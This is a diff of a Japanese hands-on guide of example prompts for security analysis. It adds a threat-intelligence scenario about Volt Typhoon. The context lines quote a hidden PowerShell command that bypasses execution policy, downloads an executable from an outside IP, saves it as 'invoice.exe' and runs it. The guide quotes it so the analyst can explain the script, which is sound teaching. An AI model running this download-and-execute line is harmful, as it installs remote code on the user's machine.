@@ -32,3 +32,11 @@ VirusTotal を使用して、このIPアドレス 185.220.101.86 のレピュテ
 以下のスクリプトは、どのような動作をするのか、順を追って説明し、その意図を推測してください
 Script:powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://185.82.217.3/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'\\invoice.exe'
  ```
+
+***
+&nbsp;
+## ハンズオンシナリオ➁　脅威インテリジェンス編
+
+ ```
+私はセキュリティエンジニアです。攻撃アクターグループ "Volt Typhoon"について、教えて下さい。
+ ```
